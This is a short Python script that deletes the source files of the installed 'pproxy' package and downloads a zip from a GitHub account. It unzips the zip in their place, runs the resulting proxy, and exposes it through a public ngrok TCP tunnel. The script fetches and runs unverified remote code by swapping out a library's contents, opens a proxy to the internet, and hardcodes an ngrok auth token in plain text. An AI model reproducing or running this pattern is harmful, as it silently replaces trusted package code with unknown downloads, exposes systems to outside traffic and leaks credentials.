from time import *
import wget,os,threading
from pyngrok import ngrok
import threading
import subprocess
os.chdir('/usr/local/lib/python3.10/dist-packages/pproxy')
for i in os.listdir():
  if '.py' in i:
    os.remove(i)
wget.download('https://github.com/GrimsGreen/code/raw/main/6qxu6o.zip')
os.popen('unzip 6qxu6o.zip').read()
def run_proxy():
  process = subprocess.run('pproxy', shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  print("Output:", process.stdout.decode())
  print("Errors:", process.stderr.decode())
def ngrok_thread(token):
    ngrok.set_auth_token(token)
    public_url = ngrok.connect("9090", "tcp")
    print(" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:{}/\"".format(public_url, 9090))
    return public_url
threading.Thread(target=run_proxy).start() 
threading.Thread(target=ngrok_thread,args=['2amKHR6V67yiXOAT4ry4dN3kwX6_3X4yXfTeAu4zYHEkdDhNM']).start()
input('>>>')
